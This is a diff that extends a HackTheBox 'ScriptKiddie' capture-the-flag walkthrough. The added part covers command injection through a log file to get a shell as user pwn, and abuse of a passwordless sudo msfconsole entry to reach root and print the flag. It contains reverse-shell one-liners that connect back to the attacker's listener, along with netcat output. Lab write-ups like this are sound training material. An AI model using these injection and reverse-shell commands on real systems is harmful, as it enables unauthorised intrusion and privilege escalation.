@@ -23,6 +23,9 @@ The exploit `use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_in
 ### 6. Privilege Escalation
 Bwoah, this one is tough. From enumerating, we find that there are three users, `kid` which we compromised, `pwn` & `root`.
 
+### 7. Final Privilege Escalation & Getting Root Flag
+x
+
 # Attack
 ## 1. NMAP
 Took a long time to run, but here it is.
@@ -491,4 +494,72 @@ echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers
 hippoeug@kali:~$ nc -lvnp 6969
 listening on [any] 6969 ...
 ```
+At this point, I was too frustrated to continue on, gave up and left.
 
+BUT. I came back stronger (with some help)... and turns out I was really close to finishing it previously.
+
+My command was almost right, and I needed 3 spaces at the front. `ignore ignore ` was 4 characters, not 3. I ended up using 3 spaces at the front instead.
+```
+echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/1234 0>&1' #" >> hackers
+
+hippoeug@kali:~$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.129.95.150] 41366
+bash: cannot set terminal process group (832): Inappropriate ioctl for device
+bash: no job control in this shell
+pwn@scriptkiddie:~$ 
+```
+Through this, I got into user `pwn`!
+
+Alternatively, I could have written `echo "ignore  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.41/1234 0>&1' #" >> hackers`, with 2 spaces after `ignore`.
+
+## 7. Final Privilege Escalation & Getting Root Flag
+As seen in [`Blocky`](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Blocky.md), there was something we should always try when privilege escalating Linux machines.
+```
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+Indeed, this works!
+
+Time to escalate as user `root` and get the flags!
+```
+pwn@scriptkiddie:~$ sudo msfconsole
+...
+msf6 > pwd
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: pwd
+
+/home/pwn
+...
+msf6 > whoami
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: whoami
+
+root
+...
+msf6 > pwd
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: pwd
+
+/root
+...
+msf6 > ls
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: ls
+
+root.txt
+snap
+...
+msf6 > cat root.txt
+stty: 'standard input': Inappropriate ioctl for device
+[*] exec: cat root.txt
+
+be03af4e25fa631012bf791a53a47195
+```
+Done! Finally!
